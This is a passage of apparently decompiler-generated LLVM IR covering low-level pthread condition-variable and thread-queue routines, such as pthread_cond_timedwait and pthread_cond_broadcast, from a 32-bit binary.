  %v6_8059f8d = icmp eq i32 %v0_8059f8d, -16
  store i1 %v6_8059f8d, i1* %zf.global-to-local, align 1
  store i32 %v3_8059f76, i32* @esi, align 4
  %v3_8059f92 = add i32 %v3_8059f3d, 440
  %v4_8059f92 = inttoptr i32 %v3_8059f92 to i8*
  store i8 %v3_8059f81, i8* %v4_8059f92, align 1
  br label %dec_label_pc_8059f98

dec_label_pc_8059f98:                             ; preds = %dec_label_pc_8059f76, %dec_label_pc_8059f85
  %v0_8059f98 = load i32, i32* @esp, align 4
  %v9_8059f98 = icmp eq i32 %v0_8059f98, 12
  store i1 %v9_8059f98, i1* %zf.global-to-local, align 1
  %v0_8059f9b = load i32, i32* @edi, align 4
  %v1_8059f9c = inttoptr i32 %v0_8059f9b to i32*
  %v2_8059f9c = call i32 @__pthread_unlock(i32* %v1_8059f9c)
  %v0_8059fa4 = load i32, i32* @esi, align 4
  %v1_8059fa4 = icmp eq i32 %v0_8059fa4, 0
  store i1 %v1_8059fa4, i1* %zf.global-to-local, align 1
  br i1 %v1_8059fa4, label %dec_label_pc_8059fb3, label %dec_label_pc_8059fa8

dec_label_pc_8059fa8:                             ; preds = %dec_label_pc_8059f98
  store i1 false, i1* %zf.global-to-local, align 1
  %v1_8059fac = call i32 @__pthread_restart_new(i32 %v3_8059f3d)
  br label %dec_label_pc_8059fc1

dec_label_pc_8059fb3:                             ; preds = %dec_label_pc_8059f98
  %v0_8059fb5 = load i32, i32* @global_var_807530c.586, align 4
  %v2_8059fbc = call i32 @kill(i32 %v0_8059fb5, i32 0)
  br label %dec_label_pc_8059fc1

dec_label_pc_8059fc1:                             ; preds = %dec_label_pc_8059fa8, %dec_label_pc_8059f6b, %dec_label_pc_8059fb3
  store i1 true, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8059fc3

dec_label_pc_8059fc3:                             ; preds = %dec_label_pc_8059f49, %dec_label_pc_8059fc1
  %storemerge = phi i32 [ 3, %dec_label_pc_8059f49 ], [ 0, %dec_label_pc_8059fc1 ]
  %v0_8059fc3 = load i32, i32* @esp, align 4
  %v9_8059fc3 = icmp eq i32 %v0_8059fc3, -28
  store i1 %v9_8059fc3, i1* %zf.global-to-local, align 1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i1 %v15_8059f44, { 1, 0 }
  uselistorder i32 %v3_8059f3d, { 0, 1, 3, 5, 4, 2, 6, 7 }
  uselistorder label %dec_label_pc_8059fc3, { 1, 0 }
  uselistorder label %dec_label_pc_8059fc1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8059f98, { 1, 0 }
}

define i32 @enqueue.9() local_unnamed_addr {
entry:
  %v0_8059fcd = load i32, i32* @edx, align 4
  %v1_8059fcd = add i32 %v0_8059fcd, 24
  %v2_8059fcd = inttoptr i32 %v1_8059fcd to i32*
  %v3_8059fcd = load i32, i32* %v2_8059fcd, align 4
  store i32 %v3_8059fcd, i32* @ebx, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @remove_from_queue.10() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059fe9 = load i32, i32* @ebx, align 4
  store i32 %v0_8059fe9, i32* %stack_var_-4, align 4
  %v0_8059fea = load i32, i32* @eax, align 4
  br label %dec_label_pc_805a008

dec_label_pc_8059fee:                             ; preds = %dec_label_pc_805a008
  %v1_8059fee = load i32, i32* @edx, align 4
  %v12_8059fee = icmp eq i32 %v2_805a008, %v1_8059fee
  %v1_8059ff0 = icmp eq i1 %v12_8059fee, false
  %v1_805a005 = add i32 %v2_805a008, 8
  br i1 %v1_8059ff0, label %dec_label_pc_805a008, label %dec_label_pc_8059ff2

dec_label_pc_8059ff2:                             ; preds = %dec_label_pc_8059fee
  %v2_8059ff2 = inttoptr i32 %v1_805a005 to i32*
  %v3_8059ff2 = load i32, i32* %v2_8059ff2, align 4
  store i32 %v3_8059ff2, i32* %v1_805a008, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v2_8059ff2, align 4
  %v2_805a010.pre = load i32, i32* %stack_var_-4, align 4
  %v0_805a011.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805a010

dec_label_pc_805a008:                             ; preds = %dec_label_pc_8059fee, %entry
  %v1_8059ff5 = phi i32 [ %v0_8059fea, %entry ], [ %v1_805a005, %dec_label_pc_8059fee ]
  %v1_805a008 = inttoptr i32 %v1_8059ff5 to i32*
  %v2_805a008 = load i32, i32* %v1_805a008, align 4
  %v1_805a00a = icmp eq i32 %v2_805a008, 0
  %v1_805a00c = icmp eq i1 %v1_805a00a, false
  br i1 %v1_805a00c, label %dec_label_pc_8059fee, label %dec_label_pc_805a00e

dec_label_pc_805a00e:                             ; preds = %dec_label_pc_805a008
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805a010

dec_label_pc_805a010:                             ; preds = %dec_label_pc_8059ff2, %dec_label_pc_805a00e
  %v0_805a011 = phi i32 [ %v0_805a011.pre, %dec_label_pc_8059ff2 ], [ 0, %dec_label_pc_805a00e ]
  %v2_805a010 = phi i32 [ %v2_805a010.pre, %dec_label_pc_8059ff2 ], [ %v0_8059fe9, %dec_label_pc_805a00e ]
  store i32 %v2_805a010, i32* @ebx, align 4
  ret i32 %v0_805a011

; uselistorder directives
  uselistorder i32 %v2_805a008, { 2, 0, 1 }
  uselistorder i32* %v1_805a008, { 1, 0 }
  uselistorder i32 %v1_805a005, { 1, 0 }
  uselistorder label %dec_label_pc_805a010, { 1, 0 }
}

define i32 @pthread_cond_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  store i32 %tmp1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %arg1, align 4
  %v1_805a01c = add i32 %tmp1, 4
  %v2_805a01c = inttoptr i32 %v1_805a01c to i32*
  store i32 0, i32* %v2_805a01c, align 4
  %v0_805a023 = load i32, i32* %eax.global-to-local, align 4
  %v1_805a023 = add i32 %v0_805a023, 8
  %v2_805a023 = inttoptr i32 %v1_805a023 to i32*
  store i32 0, i32* %v2_805a023, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0
}

define i32 @__GI_pthread_cond_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 16
}

define i32 @pthread_condattr_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_condattr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @pthread_condattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_condattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp2 = icmp eq i32 %tmp, 1
  br i1 %tmp2, label %dec_label_pc_805a05e, label %dec_label_pc_805a065

dec_label_pc_805a05e:                             ; preds = %entry
  br label %dec_label_pc_805a065

dec_label_pc_805a065:                             ; preds = %entry, %dec_label_pc_805a05e
  %v0_805a065 = phi i32 [ 22, %entry ], [ 38, %dec_label_pc_805a05e ]
  ret i32 %v0_805a065

; uselistorder directives
  uselistorder label %dec_label_pc_805a065, { 1, 0 }
}

define i32 @__pthread_set_own_extricate_if.11(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805a066 = load i32, i32* @esi, align 4
  %v0_805a067 = load i32, i32* @edx, align 4
  store i32 %v0_805a067, i32* @esi, align 4
  %v0_805a069 = load i32, i32* @ebx, align 4
  %v0_805a06a = load i32, i32* @eax, align 4
  store i32 %v0_805a06a, i32* @ebx, align 4
  %v1_805a06f = icmp eq i32 %v0_805a067, 0
  br i1 %v1_805a06f, label %dec_label_pc_805a07b, label %dec_label_pc_805a073

dec_label_pc_805a073:                             ; preds = %entry
  %v1_805a073 = add i32 %v0_805a06a, 64
  %v2_805a073 = inttoptr i32 %v1_805a073 to i8*
  %v3_805a073 = load i8, i8* %v2_805a073, align 1
  %v4_805a073 = icmp eq i8 %v3_805a073, 0
  %v1_805a077 = icmp eq i1 %v4_805a073, false
  br i1 %v1_805a077, label %dec_label_pc_805a09d, label %dec_label_pc_805a085

dec_label_pc_805a07b:                             ; preds = %entry
  %v1_805a07b = add i32 %v0_805a06a, 28
  %v2_805a07b = inttoptr i32 %v1_805a07b to i32*
  %v3_805a07b = load i32, i32* %v2_805a07b, align 4
  store i32 %v3_805a07b, i32* @eax, align 4
  store i32 %v0_805a06a, i32* @edx, align 4
  %v1_805a080 = call i32 @__pthread_lock(i32 %v0_805a069)
  %v1_805a087.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805a085

dec_label_pc_805a085:                             ; preds = %dec_label_pc_805a073, %dec_label_pc_805a07b
  %v1_805a087 = phi i32 [ %v0_805a06a, %dec_label_pc_805a073 ], [ %v1_805a087.pre, %dec_label_pc_805a07b ]
  %v2_805a087 = add i32 %v1_805a087, 444
  %v3_805a087 = inttoptr i32 %v2_805a087 to i32*
  store i32 %v0_805a067, i32* %v3_805a087, align 4
  %v1_805a08d = icmp eq i1 %v1_805a06f, false
  br i1 %v1_805a08d, label %dec_label_pc_805a09d, label %dec_label_pc_805a08f

dec_label_pc_805a08f:                             ; preds = %dec_label_pc_805a085
  %v0_805a092 = load i32, i32* @ebx, align 4
  %v1_805a092 = add i32 %v0_805a092, 28
  %v2_805a092 = inttoptr i32 %v1_805a092 to i32*
  %v3_805a092 = load i32, i32* %v2_805a092, align 4
  %v1_805a095 = inttoptr i32 %v3_805a092 to i32*
  %v2_805a095 = call i32 @__pthread_unlock(i32* %v1_805a095)
  br label %dec_label_pc_805a09d

dec_label_pc_805a09d:                             ; preds = %dec_label_pc_805a085, %dec_label_pc_805a073, %dec_label_pc_805a08f
  %v2_805a09d = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_805a069, i32* @ebx, align 4
  store i32 %v0_805a066, i32* @esi, align 4
  ret i32 %v2_805a09d

; uselistorder directives
  uselistorder i32 %v0_805a067, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805a09d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805a085, { 1, 0 }
}

define i32 @restart.12() local_unnamed_addr {
entry:
  %v0_805a0a4 = load i32, i32* @eax, align 4
  %v1_805a0a5 = call i32 @__pthread_restart_new(i32 %v0_805a0a4)
  ret i32 %v1_805a0a5
}

define i32 @pthread_cond_broadcast(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @edx, align 4
  %v0_805a0b1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_805a0bb = call i32 @__pthread_lock(i32 %v0_805a0b1)
  %v0_805a0c3 = load i32, i32* @ebx, align 4
  %v1_805a0c3 = add i32 %v0_805a0c3, 8
  %v2_805a0c3 = inttoptr i32 %v1_805a0c3 to i32*
  %v3_805a0c3 = load i32, i32* %v2_805a0c3, align 4
  store i32 %v3_805a0c3, i32* @esi, align 4
  store i32 0, i32* %v2_805a0c3, align 4
  %v0_805a0cd = load i32, i32* @ebx, align 4
  %v1_805a0ce = inttoptr i32 %v0_805a0cd to i32*
  %v2_805a0ce = call i32 @__pthread_unlock(i32* %v1_805a0ce)
  %v0_805a0f21 = load i32, i32* @esi, align 4
  %v1_805a0f22 = icmp eq i32 %v0_805a0f21, 0
  %v1_805a0f49 = icmp eq i1 %v1_805a0f22, false
  br i1 %v1_805a0f49, label %dec_label_pc_805a0d8, label %dec_label_pc_805a0f6

dec_label_pc_805a0d8:                             ; preds = %entry, %dec_label_pc_805a0d8
  %v0_805a0d8 = phi i32 [ %v0_805a0f2, %dec_label_pc_805a0d8 ], [ %v0_805a0f21, %entry ]
  %v1_805a0d8 = add i32 %v0_805a0d8, 8
  %v2_805a0d8 = inttoptr i32 %v1_805a0d8 to i32*
  %v3_805a0d8 = load i32, i32* %v2_805a0d8, align 4
  store i32 %v3_805a0d8, i32* @ebx, align 4
  %v1_805a0db = add i32 %v0_805a0d8, 441
  %v2_805a0db = inttoptr i32 %v1_805a0db to i8*
  store i8 1, i8* %v2_805a0db, align 1
  %v0_805a0e2 = load i32, i32* @esi, align 4
  %v1_805a0e2 = add i32 %v0_805a0e2, 8
  %v2_805a0e2 = inttoptr i32 %v1_805a0e2 to i32*
  store i32 0, i32* %v2_805a0e2, align 4
  %v0_805a0e9 = load i32, i32* @esi, align 4
  store i32 %v0_805a0e9, i32* @eax, align 4
  %v0_805a0eb = load i32, i32* @ebx, align 4
  store i32 %v0_805a0eb, i32* @esi, align 4
  %v0_805a0ed = call i32 @restart.12()
  %v0_805a0f2 = load i32, i32* @esi, align 4
  %v1_805a0f2 = icmp eq i32 %v0_805a0f2, 0
  %v1_805a0f4 = icmp eq i1 %v1_805a0f2, false
  br i1 %v1_805a0f4, label %dec_label_pc_805a0d8, label %dec_label_pc_805a0f6

dec_label_pc_805a0f6:                             ; preds = %dec_label_pc_805a0d8, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_805a0f2, { 1, 0 }
  uselistorder i32 %v0_805a0d8, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805a0d8, { 1, 0 }
}

define i32 @thread_self.13(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_805a0fc = load i32, i32* @esp, align 4
  %v1_805a0fc = load i32, i32* @global_var_8079c4c.565, align 4
  %v7_805a0fc = icmp ult i32 %v0_805a0fc, %v1_805a0fc
  %v1_805a109 = icmp eq i1 %v7_805a0fc, false
  br i1 %v1_805a109, label %dec_label_pc_805a13a, label %dec_label_pc_805a10b

dec_label_pc_805a10b:                             ; preds = %entry
  %v1_805a10b = load i32, i32* @global_var_8079c50.566, align 16
  %v7_805a10b = icmp ult i32 %v0_805a0fc, %v1_805a10b
  br i1 %v7_805a10b, label %dec_label_pc_805a120, label %dec_label_pc_805a113

dec_label_pc_805a113:                             ; preds = %dec_label_pc_805a10b
  %v1_805a113 = load i32, i32* @global_var_8079c54.567, align 4
  %v7_805a113 = icmp ult i32 %v0_805a0fc, %v1_805a113
  br i1 %v7_805a113, label %dec_label_pc_805a13a, label %dec_label_pc_805a120

dec_label_pc_805a120:                             ; preds = %dec_label_pc_805a113, %dec_label_pc_805a10b
  %v0_805a120 = load i32, i32* @global_var_807f358.569, align 8
  %v1_805a120 = icmp eq i32 %v0_805a120, 0
  br i1 %v1_805a120, label %dec_label_pc_805a12e, label %dec_label_pc_805a129

dec_label_pc_805a129:                             ; preds = %dec_label_pc_805a120
  %v0_805a129 = call i32 @__pthread_find_self()
  br label %dec_label_pc_805a12e

dec_label_pc_805a12e:                             ; preds = %dec_label_pc_805a120, %dec_label_pc_805a129
  %v2_805a134 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_805a13a

dec_label_pc_805a13a:                             ; preds = %dec_label_pc_805a113, %entry, %dec_label_pc_805a12e
  %v0_805a13a = phi i32 [ ptrtoint (i32* @global_var_8075120.568 to i32), %dec_label_pc_805a113 ], [ ptrtoint (i32* @global_var_8074f40 to i32), %entry ], [ %v2_805a134, %dec_label_pc_805a12e ]
  ret i32 %v0_805a13a

; uselistorder directives
  uselistorder label %dec_label_pc_805a13a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805a12e, { 1, 0 }
}

define i32 @cond_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_805a13b = load i32, i32* @esi, align 4
  %v0_805a13c = load i32, i32* @ebx, align 4
  %v2_805a140 = call i32 @thread_self.13(i32 %v0_805a13c, i32 %v0_805a13b)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %v2_805a140, i32* @edx, align 4
  %v1_805a153 = call i32 @__pthread_lock(i32 %v2_805a140)
  store i32 %arg2, i32* @edx, align 4
  %v0_805a15c = load i32, i32* @ebx, align 4
  %v1_805a15c = add i32 %v0_805a15c, 8
  store i32 %v1_805a15c, i32* @eax, align 4
  %v0_805a15f = call i32 @remove_from_queue.10()
  %v0_805a167 = load i32, i32* @ebx, align 4
  store i32 %v0_805a15f, i32* @esi, align 4
  %v1_805a16a = inttoptr i32 %v0_805a167 to i32*
  %v2_805a16a = call i32 @__pthread_unlock(i32* %v1_805a16a)
  %v0_805a172 = load i32, i32* @esi, align 4
  ret i32 %v0_805a172

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @suspend.14() local_unnamed_addr {
entry:
  %v0_805a17a = load i32, i32* @eax, align 4
  %v1_805a17b = call i32 @__pthread_wait_for_restart_signal(i32 %v0_805a17a)
  ret i32 %v1_805a17b
}

define i32 @__GI_pthread_cond_timedwait(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805a186 = load i32, i32* @esi, align 4
  %v0_805a187 = load i32, i32* @ebx, align 4
  store i32 %v0_805a187, i32* %stack_var_-16, align 4
  %v4_805a187 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805a18b = call i32 @thread_self.13(i32 %v0_805a187, i32 %v0_805a186)
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_805a19c = add i32 %arg2, 12
  %v2_805a19c = inttoptr i32 %v1_805a19c to i32*
  %v3_805a19c = load i32, i32* %v2_805a19c, align 4
  %v9_805a19f = icmp eq i32 %v3_805a19c, 3
  br i1 %v9_805a19f, label %dec_label_pc_805a1ba, label %dec_label_pc_805a1a4

dec_label_pc_805a1a4:                             ; preds = %entry
  %v1_805a1a4 = icmp eq i32 %v3_805a19c, 0
  br i1 %v1_805a1a4, label %dec_label_pc_805a1ba, label %dec_label_pc_805a1a8

dec_label_pc_805a1a8:                             ; preds = %dec_label_pc_805a1a4
  %v1_805a1b1 = add i32 %arg2, 8
  %v2_805a1b1 = inttoptr i32 %v1_805a1b1 to i32*
  %v3_805a1b1 = load i32, i32* %v2_805a1b1, align 4
  %v15_805a1b1 = icmp eq i32 %v3_805a1b1, %v2_805a18b
  %v1_805a1b4 = icmp eq i1 %v15_805a1b1, false
  br i1 %v1_805a1b4, label %dec_label_pc_805a1a8.dec_label_pc_805a32c_crit_edge, label %dec_label_pc_805a1ba

dec_label_pc_805a1a8.dec_label_pc_805a32c_crit_edge: ; preds = %dec_label_pc_805a1a8
  br label %dec_label_pc_805a32c

dec_label_pc_805a1ba:                             ; preds = %dec_label_pc_805a1a8, %dec_label_pc_805a1a4, %entry
  %v2_805a1be = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_805a1be, i32* @edx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v1_805a1ce = add i32 %v2_805a18b, 441
  %v2_805a1ce = inttoptr i32 %v1_805a1ce to i8*
  store i8 0, i8* %v2_805a1ce, align 1
  store i32 %v2_805a18b, i32* @eax, align 4
  %v0_805a1d9 = load i32, i32* %stack_var_-28, align 4
  %v2_805a1d9 = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_805a1d9, i32 134586683)
  store i32 %v2_805a18b, i32* @edx, align 4
  %v0_805a1e2 = load i32, i32* @esi, align 4
  store i32 %v0_805a1e2, i32* @eax, align 4
  %v1_805a1e4 = call i32 @__pthread_lock(i32 134586683)
  %v1_805a1ed = add i32 %v2_805a18b, 66
  %v2_805a1ed = inttoptr i32 %v1_805a1ed to i8*
  %v3_805a1ed = load i8, i8* %v2_805a1ed, align 1
  %v4_805a1ed = icmp eq i8 %v3_805a1ed, 0
  br i1 %v4_805a1ed, label %dec_label_pc_805a202, label %dec_label_pc_805a1f3

dec_label_pc_805a1f3:                             ; preds = %dec_label_pc_805a1ba
  store i32 1, i32* @ebx, align 4
  %v1_805a1fc = add i32 %v2_805a18b, 64
  %v2_805a1fc = inttoptr i32 %v1_805a1fc to i8*
  %v3_805a1fc = load i8, i8* %v2_805a1fc, align 1
  %v4_805a1fc = icmp eq i8 %v3_805a1fc, 0
  br i1 %v4_805a1fc, label %dec_label_pc_805a210, label %dec_label_pc_805a202

dec_label_pc_805a202:                             ; preds = %dec_label_pc_805a1f3, %dec_label_pc_805a1ba
  store i32 %v2_805a18b, i32* @edx, align 4
  %v0_805a20b = call i32 @enqueue.9()
  br label %dec_label_pc_805a210

dec_label_pc_805a210:                             ; preds = %dec_label_pc_805a1f3, %dec_label_pc_805a202
  %v0_805a213 = load i32, i32* @esi, align 4
  store i32 %v0_805a213, i32* %stack_var_-60, align 4
  %v1_805a214 = inttoptr i32 %v0_805a213 to i32*
  %v2_805a214 = call i32 @__pthread_unlock(i32* %v1_805a214)
  %v0_805a21c = load i32, i32* @ebx, align 4
  %v1_805a21c = icmp eq i32 %v0_805a21c, 0
  br i1 %v1_805a21c, label %dec_label_pc_805a232, label %dec_label_pc_805a220

dec_label_pc_805a220:                             ; preds = %dec_label_pc_805a210
  store i32 %v2_805a18b, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_805a226 = load i32, i32* %stack_var_-60, align 4
  %v1_805a226 = load i32, i32* %stack_var_-56, align 4
  %v2_805a226 = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_805a226, i32 %v1_805a226)
  br label %dec_label_pc_805a2e8

dec_label_pc_805a232:                             ; preds = %dec_label_pc_805a210
  store i32 0, i32* @edi, align 4
  %v0_805a237 = load i32, i32* @ebp, align 4
  store i32 %v0_805a237, i32* %stack_var_-60, align 4
  %v1_805a238 = call i32 @pthread_mutex_unlock(i32 %v0_805a237)
  %v3_805a24b = inttoptr i32 %arg3 to i32*
  %v1_805a29a = add i32 %v2_805a18b, 440
  %v2_805a29a = inttoptr i32 %v1_805a29a to i8*
  %v1_805a2a7 = add i32 %v2_805a18b, 64
  %v2_805a2a7 = inttoptr i32 %v1_805a2a7 to i8*
  br label %dec_label_pc_805a240

dec_label_pc_805a240:                             ; preds = %dec_label_pc_805a2ad, %dec_label_pc_805a232
  %v0_805a244 = load i32, i32* @edx, align 4
  store i32 %arg3, i32* %stack_var_-56, align 4
  store i32 %v2_805a18b, i32* %stack_var_-60, align 4
  %v4_805a24b = call i32 @__pthread_timedsuspend_new(i32 %v2_805a18b, i32* %v3_805a24b, i32 %v0_805a244)
  %v1_805a253 = icmp eq i32 %v4_805a24b, 0
  %v1_805a255 = icmp eq i1 %v1_805a253, false
  br i1 %v1_805a255, label %dec_label_pc_805a289, label %dec_label_pc_805a257

dec_label_pc_805a257:                             ; preds = %dec_label_pc_805a240
  store i32 %v2_805a18b, i32* @edx, align 4
  %v0_805a25b = load i32, i32* @esi, align 4
  store i32 %v0_805a25b, i32* @eax, align 4
  %v0_805a25d = load i32, i32* %stack_var_-60, align 4
  %v1_805a25d = call i32 @__pthread_lock(i32 %v0_805a25d)
  store i32 %v2_805a18b, i32* @edx, align 4
  %v0_805a266 = load i32, i32* @esi, align 4
  %v1_805a266 = add i32 %v0_805a266, 8
  store i32 %v1_805a266, i32* @eax, align 4
  %v0_805a269 = call i32 @remove_from_queue.10()
  %v0_805a271 = load i32, i32* @esi, align 4
  store i32 %v0_805a271, i32* %stack_var_-60, align 4
  store i32 %v0_805a269, i32* @ebx, align 4
  %v1_805a274 = inttoptr i32 %v0_805a271 to i32*
  %v2_805a274 = call i32 @__pthread_unlock(i32* %v1_805a274)
  %v1_805a27c = icmp eq i32 %v0_805a269, 0
  %v1_805a27e = icmp eq i1 %v1_805a27c, false
  br i1 %v1_805a27e, label %dec_label_pc_805a2f4, label %dec_label_pc_805a280

dec_label_pc_805a280:                             ; preds = %dec_label_pc_805a257
  store i32 %v2_805a18b, i32* @eax, align 4
  %v0_805a284 = call i32 @suspend.14()
  br label %dec_label_pc_805a289

dec_label_pc_805a289:                             ; preds = %dec_label_pc_805a240, %dec_label_pc_805a280
  %v3_805a28d = load i8, i8* %v2_805a1ce, align 1
  %v4_805a28d = icmp eq i8 %v3_805a28d, 0
  %v1_805a294 = icmp eq i1 %v4_805a28d, false
  br i1 %v1_805a294, label %dec_label_pc_805a2b0, label %dec_label_pc_805a296

dec_label_pc_805a296:                             ; preds = %dec_label_pc_805a289
  %v3_805a29a = load i8, i8* %v2_805a29a, align 1
  %v4_805a29a = icmp eq i8 %v3_805a29a, 0
  br i1 %v4_805a29a, label %dec_label_pc_805a2ad, label %dec_label_pc_805a2a3

dec_label_pc_805a2a3:                             ; preds = %dec_label_pc_805a296
  %v3_805a2a7 = load i8, i8* %v2_805a2a7, align 1
  %v4_805a2a7 = icmp eq i8 %v3_805a2a7, 0
  br i1 %v4_805a2a7, label %dec_label_pc_805a2b0, label %dec_label_pc_805a2ad

dec_label_pc_805a2ad:                             ; preds = %dec_label_pc_805a2a3, %dec_label_pc_805a296
  %v0_805a2ad = load i32, i32* @edi, align 4
  %v1_805a2ad = add i32 %v0_805a2ad, 1
  store i32 %v1_805a2ad, i32* @edi, align 4
  br label %dec_label_pc_805a240

dec_label_pc_805a2b0:                             ; preds = %dec_label_pc_805a2a3, %dec_label_pc_805a289
  store i32 %v2_805a18b, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_805a2b6 = load i32, i32* %stack_var_-60, align 4
  %v1_805a2b6 = load i32, i32* %stack_var_-56, align 4
  %v2_805a2b6 = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_805a2b6, i32 %v1_805a2b6)
  %v3_805a2bf = load i8, i8* %v2_805a29a, align 1
  %v4_805a2bf = icmp eq i8 %v3_805a2bf, 0
  br i1 %v4_805a2bf, label %dec_label_pc_805a318.preheader, label %dec_label_pc_805a2c8

dec_label_pc_805a2c8:                             ; preds = %dec_label_pc_805a2b0
  %v3_805a2cc = load i8, i8* %v2_805a2a7, align 1
  %v4_805a2cc = icmp eq i8 %v3_805a2cc, 0
  %v1_805a2d0 = icmp eq i1 %v4_805a2cc, false
  br i1 %v1_805a2d0, label %dec_label_pc_805a318.preheader, label %dec_label_pc_805a2d2

dec_label_pc_805a318.preheader:                   ; preds = %dec_label_pc_805a2b0, %dec_label_pc_805a2c8
  %v0_805a31819 = load i32, i32* @edi, align 4
  %v1_805a31820 = add i32 %v0_805a31819, -1
  store i32 %v1_805a31820, i32* @edi, align 4
  %v10_805a31926 = icmp eq i32 %v0_805a31819, 0
  %v1_805a31c28 = icmp eq i1 %v10_805a31926, false
  br i1 %v1_805a31c28, label %dec_label_pc_805a30f, label %dec_label_pc_805a31e

dec_label_pc_805a2d2:                             ; preds = %dec_label_pc_805a2c8
  store i8 0, i8* %v2_805a29a, align 1
  %v0_805a2e0 = load i32, i32* @ebp, align 4
  store i32 %v0_805a2e0, i32* %stack_var_-60, align 4
  %v1_805a2e1 = call i32 @pthread_mutex_lock(i32 %v0_805a2e0)
  store i32 %v0_805a2e0, i32* @ecx, align 4
  %v2_805a2e7 = load i32, i32* %stack_var_-56, align 4
  store i32 %v2_805a2e7, i32* @ebx, align 4
  br label %dec_label_pc_805a2e8

dec_label_pc_805a2e8:                             ; preds = %dec_label_pc_805a220, %dec_label_pc_805a2d2
  store i32 %v4_805a187, i32* %stack_var_-56, align 4
  store i32 -1, i32* %stack_var_-60, align 4
  %v2_805a2ef = call i32 @__pthread_do_exit(i32 -1, i32 %v4_805a187)
  br label %dec_label_pc_805a2f4

dec_label_pc_805a2f4:                             ; preds = %dec_label_pc_805a257, %dec_label_pc_805a2e8
  store i32 %v2_805a18b, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_805a2fa = load i32, i32* %stack_var_-60, align 4
  %v1_805a2fa = load i32, i32* %stack_var_-56, align 4
  %v2_805a2fa = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_805a2fa, i32 %v1_805a2fa)
  %v0_805a302 = load i32, i32* @ebp, align 4
  store i32 %v0_805a302, i32* %stack_var_-60, align 4
  %v1_805a303 = call i32 @pthread_mutex_lock(i32 %v0_805a302)
  br label %dec_label_pc_805a329

dec_label_pc_805a30f:                             ; preds = %dec_label_pc_805a318.preheader, %dec_label_pc_805a30f
  store i32 %v2_805a18b, i32* @eax, align 4
  %v0_805a313 = call i32 @restart.12()
  %v0_805a318 = load i32, i32* @edi, align 4
  %v1_805a318 = add i32 %v0_805a318, -1
  store i32 %v1_805a318, i32* @edi, align 4
  %v10_805a319 = icmp eq i32 %v0_805a318, 0
  %v1_805a31c = icmp eq i1 %v10_805a319, false
  br i1 %v1_805a31c, label %dec_label_pc_805a30f, label %dec_label_pc_805a31e

dec_label_pc_805a31e:                             ; preds = %dec_label_pc_805a30f, %dec_label_pc_805a318.preheader
  %v0_805a321 = load i32, i32* @ebp, align 4
  store i32 %v0_805a321, i32* %stack_var_-60, align 4
  %v1_805a322 = call i32 @pthread_mutex_lock(i32 %v0_805a321)
  br label %dec_label_pc_805a329

dec_label_pc_805a329:                             ; preds = %dec_label_pc_805a2f4, %dec_label_pc_805a31e
  %storemerge1 = phi i32 [ 110, %dec_label_pc_805a2f4 ], [ 0, %dec_label_pc_805a31e ]
  br label %dec_label_pc_805a32c

dec_label_pc_805a32c:                             ; preds = %dec_label_pc_805a1a8.dec_label_pc_805a32c_crit_edge, %dec_label_pc_805a329
  %v0_805a32f = phi i32 [ 22, %dec_label_pc_805a1a8.dec_label_pc_805a32c_crit_edge ], [ %storemerge1, %dec_label_pc_805a329 ]
  ret i32 %v0_805a32f

; uselistorder directives
  uselistorder i32 %v0_805a269, { 1, 0 }
  uselistorder i32 %v3_805a19c, { 1, 0 }
